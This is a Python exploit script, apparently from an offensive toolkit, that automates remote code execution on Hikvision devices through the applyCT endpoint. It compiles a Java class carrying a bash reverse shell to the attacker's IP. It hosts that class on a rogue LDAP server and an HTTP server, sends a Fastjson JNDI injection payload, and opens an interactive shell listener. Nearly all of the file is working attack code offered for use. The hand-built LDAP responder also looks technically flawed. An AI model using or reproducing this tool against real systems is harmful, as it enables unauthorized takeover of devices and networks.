#!/usr/bin/env python3
# File: modules/exploits/hikvision_applyct_exploit.py

import http.server, socketserver, threading, argparse, subprocess, requests, json, os, socket, time, signal
from datetime import datetime
from pathlib import Path

# Constants
LDAP_PORT = 1389
HTTP_PORT = 8000
SHELL_PORT = 4444
CLASS_NAME = "Exploit"
CLASS_FILE = f"{CLASS_NAME}.class"
PAYLOAD_DIR = Path("payloads")
LOG_DIR = Path("logs")
STIX_DIR = Path("results/stix")
CLASS_PATH = PAYLOAD_DIR / CLASS_FILE

# Java Reverse Shell Payload (bash)
JAVA_CODE = f"""
public class {CLASS_NAME} {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/SHELL_PORT 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""

# ---------- Utility ----------
def detect_attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    print(f"[+] Auto-detected attacker IP: {ip}")
    return ip

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

# ---------- Java Compilation ----------
def generate_payload(attacker_ip):
    PAYLOAD_DIR.mkdir(exist_ok=True)
    java_file = PAYLOAD_DIR / f"{CLASS_NAME}.java"
    java_code = JAVA_CODE.replace("ATTACKER_IP", attacker_ip).replace("SHELL_PORT", str(SHELL_PORT))
    with open(java_file, "w") as f:
        f.write(java_code)
    print("[+] Compiling Java payload...")
    subprocess.run(["javac", str(java_file)], check=True)
    if not CLASS_PATH.exists():
        print("[-] Java payload compilation failed.")
        exit(1)
    print(f"[+] Payload compiled to {CLASS_PATH}")

# ---------- LDAP Rogue Server ----------
class RogueLDAPHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/x-java-serialized-object")
        self.end_headers()
        payload = (
            b'\xac\xed\x00\x05sr\x00\x11javax.naming.Reference'
            b'\x5b\x81\xcb\xec\x02\x00\x03L\x00\x04addr'
            b't\x00\x13Ljava/lang/Object;L\x00\x08classNamet\x00\x12Ljava/lang/String;'
            b'L\x00\x0bclassFactoryt\x00\x12Ljava/lang/String;xppt\x00\x07Exploit'
            b't\x00\x04Explt\x00\x04Expl'
        )
        self.wfile.write(payload)

def start_ldap_server():
    with socketserver.TCPServer(("", LDAP_PORT), RogueLDAPHandler) as httpd:
        print(f"[+] LDAP server on port {LDAP_PORT}")
        httpd.serve_forever()

def start_http_server():
    os.chdir(str(PAYLOAD_DIR))
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        print(f"[+] HTTP server on port {HTTP_PORT}")
        httpd.serve_forever()

# ---------- Reverse Shell Listener ----------
def start_shell_listener(log_file):
    LOG_DIR.mkdir(exist_ok=True)
    print(f"[+] Listening for shell on port {SHELL_PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', SHELL_PORT))
        s.listen(1)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}")
        with open(log_file, "w") as log:
            while True:
                try:
                    cmd = input("$ ")
                    if cmd.strip() == "exit":
                        break
                    conn.sendall((cmd + "\n").encode())
                    data = conn.recv(4096)
                    output = data.decode(errors='ignore')
                    print(output, end='')
                    log.write(output)
                    log.flush()
                except KeyboardInterrupt:
                    break
        conn.close()

# ---------- Exploit Sender ----------
def send_exploit(target_url, attacker_ip):
    full_url = f"{target_url}/bic/ssoService/v1/applyCT"
    ldap_url = f"ldap://{attacker_ip}:{LDAP_PORT}/Exploit"
    payload = {
        "data": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": ldap_url,
            "autoCommit": True
        }
    }
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(full_url, headers=headers, data=json.dumps(payload), timeout=10, verify=False)
        print(f"[+] Exploit sent: {response.status_code}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

# ---------- STIX Export ----------
def export_stix(target_url):
    STIX_DIR.mkdir(parents=True, exist_ok=True)
    stix_file = STIX_DIR / f"hikvision_exploit_{timestamp()}.json"
    content = {
        "type": "attack-pattern",
        "name": "CVE-2025-34067 Hikvision RCE",
        "description": f"Exploit sent to {target_url} via Fastjson/JNDI",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    with open(stix_file, "w") as f:
        json.dump(content, f, indent=2)
    print(f"[+] STIX exported to {stix_file}")

# ---------- Main ----------
def main():
    parser = argparse.ArgumentParser(description="CVE-2025-34067 - Automated Hikvision RCE")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://192.168.1.50:8080)")
    parser.add_argument("--attacker-ip", help="Override auto-detected attacker IP")
    args = parser.parse_args()

    attacker_ip = args.attacker_ip or detect_attacker_ip()
    log_file = LOG_DIR / f"session_{timestamp()}.log"

    generate_payload(attacker_ip)

    # Background servers
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_ldap_server, daemon=True).start()
    time.sleep(2)

    send_exploit(args.target, attacker_ip)
    export_stix(args.target)

    try:
        start_shell_listener(log_file)
    except KeyboardInterrupt:
        print("\n[!] Shell listener terminated.")

    print("[+] Cleanup complete.")

if __name__ == "__main__":
    main()
